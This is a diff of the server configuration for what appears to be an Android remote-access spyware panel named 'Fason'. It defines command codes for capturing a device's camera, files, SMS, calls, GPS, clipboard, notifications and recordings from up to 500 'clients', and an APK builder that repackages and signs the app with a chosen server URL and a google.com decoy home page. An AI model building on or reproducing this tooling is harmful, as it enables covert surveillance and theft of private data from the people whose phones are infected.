@@ -1,33 +1,18 @@
 const path = require('path');
-const fs = require('fs');
 
-// Ensure required directories exist
-function ensureDir(dir) {
-    if (!fs.existsSync(dir)) {
-        fs.mkdirSync(dir, { recursive: true });
-    }
-}
+// Main config
+const config = {
+    // Server
+    port: 22533,
+    debug: false,
 
-module.exports = {
-    // Server config
-    port: process.env.PORT || 22533,
-    debug: process.env.NODE_ENV !== 'production',
-    
-    // Paths (adjusted for config subdirectory location)
-    dbPath: path.join(__dirname, '../../database'),
-    downloadsPath: path.join(__dirname, '../../database/client_downloads'),
-    photosPath: path.join(__dirname, '../../database/client_photos'),
-    
-    // Initialize directories on startup
-    init() {
-        ensureDir(this.dbPath);
-        ensureDir(this.downloadsPath);
-        ensureDir(this.photosPath);
-        ensureDir(path.join(this.dbPath, 'clients'));
-        ensureDir(this.getBuiltApkPath());
-    },
-    
-    // Message keys (matching Android app)
+    // Data paths
+    dbPath: path.join(__dirname, '../../data'),
+    downloadsPath: path.join(__dirname, '../../data/clients/downloads'),
+    photosPath: path.join(__dirname, '../../data/clients/photos'),
+    recordingsPath: path.join(__dirname, '../../data/clients/recordings'),
+
+    // Message codes
     msg: {
         camera: '0xCA',
         files: '0xFI',
@@ -41,63 +26,64 @@ module.exports = {
         clipboard: '0xCB',
         apps: '0xIN',
         permissions: '0xPM',
-        checkPerm: '0xGP'
+        checkPerm: '0xGP',
+        fasonManager: '0xFM',
+        deviceInfo: '0xIF'
     },
-    
-    // Feature limits
+
+    // Limits
     limits: {
         maxClients: 500,
         maxDownloads: 100,
         maxPhotos: 100,
+        maxRecordings: 100,
         maxGpsHistory: 100,
         maxSmsHistory: 250,
         maxCallsHistory: 250,
         maxNotifications: 200,
         maxClipboardHistory: 200,
-        maxFileSize: 50 * 1024 * 1024 // 50MB
+        maxFileSize: 50 * 1024 * 1024
     },
-    
-    // Socket config
+
+    // Socket
     socket: {
         pingInterval: 25000,
         pingTimeout: 60000,
-        maxHttpBufferSize: 50e6, // 50MB
+        maxHttpBufferSize: 50e6,
         transports: ['websocket', 'polling'],
-        cors: {
-            origin: '*',
-            methods: ['GET', 'POST']
-        }
+        cors: { origin: '*', methods: ['GET', 'POST'] }
     },
-    
-    // Rate limiting
+
+    // Rate limit
     rateLimit: {
-        windowMs: 60000, // 1 minute
+        windowMs: 60000,
         maxRequests: 100
     },
-    
-    // Build config
+
+    // APK build
     build: {
-        timeout: 300000, // 5 minutes
+        timeout: 600000,
         defaultUrl: 'http://127.0.0.1:22533',
         defaultHome: 'https://google.com',
-        // Paths (relative to server directory)
         apkToolPath: path.join(__dirname, '../../app/factory/apktool.jar'),
         signerPath: path.join(__dirname, '../../app/factory/uber-apk-signer.jar'),
-        rawApkPath: path.join(__dirname, '../../app/factory/rawapk/Fason.apk'),
+        baseApkPath: path.join(__dirname, '../../app/factory/baseApp/Fason.apk'),
         decompilePath: path.join(__dirname, '../../app/factory/decompiled')
     },
-    
-    // Build paths that depend on dbPath (use as functions)
+
+    // Dynamic paths
     getProgressFile() { return path.join(this.dbPath, 'build_progress.json'); },
     getBuiltApkPath() { return path.join(this.dbPath, 'built_apks'); },
     getOutputApk() { return path.join(this.getBuiltApkPath(), 'build.apk'); },
     getSignedApkName() { return 'Fason.apk'; },
     getSignedApk() { return path.join(this.getBuiltApkPath(), this.getSignedApkName()); },
-    
+
     // Security
     security: {
-        sessionTimeout: 24 * 60 * 60 * 1000, // 24 hours
+        sessionTimeout: 24 * 60 * 60 * 1000,
         loginAttempts: 5,
-        loginLockout: 15 * 60 * 1000 // 15 minutes
+        loginLockout: 15 * 60 * 1000
     }
 };
+
+module.exports = config;
